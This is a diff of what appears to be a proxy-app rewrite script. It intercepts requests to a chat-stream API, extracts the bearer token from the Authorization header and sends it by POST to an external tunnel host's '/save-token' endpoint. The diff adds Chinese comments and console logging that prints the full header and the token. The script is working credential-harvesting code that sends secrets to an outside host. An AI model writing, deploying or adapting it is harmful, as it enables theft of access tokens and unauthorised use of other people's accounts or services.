@@ -5,17 +5,20 @@
 hostname = api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app
 ********************************/
 
+
 const targetURL = 'https://api-v4-generatechatstream-7hb5gcrmka-uc.a.run.app/';
 
 if ($request && $request.url.includes(targetURL)) {
     const authorizationHeader = $request.headers['authorization'] || $request.headers['Authorization'];
-    console.log('Token saved response: ' + authorizationHeader);
     
     if (authorizationHeader) {
+        console.log(`Authorization Header: ${authorizationHeader}`); // 打印整个 Authorization header
+        
         const bearerToken = authorizationHeader.split(' ')[1];
         
         if (bearerToken) {
-            console.log(`Bearer Token: ${bearerToken}`);
+            console.log(`Bearer Token: ${bearerToken}`); // 打印 Bearer Token
+            
             const saveTokenRequest = {
                 url: 'https://4f9f562e.r6.cpolar.top/save-token',
                 method: 'POST',
@@ -26,16 +29,17 @@ if ($request && $request.url.includes(targetURL)) {
             };
 
             $task.fetch(saveTokenRequest).then(response => {
-                console.log('Token saved response: ' + response.body);
+                console.log('Token saved response: ' + response.body); // 打印服务器响应
             }).catch(error => {
-                console.log('Error saving token: ' + error);
+                console.log('Error saving token: ' + error); // 打印错误信息
             });
         } else {
-            console.log("Bearer token not found in authorization header.");
+            console.log("Bearer token not found in authorization header."); // 如果没有找到Bearer Token
         }
     } else {
-        console.log("Authorization header not found.");
+        console.log("Authorization header not found."); // 如果没有找到Authorization header
     }
 }
 
 $done({});
+
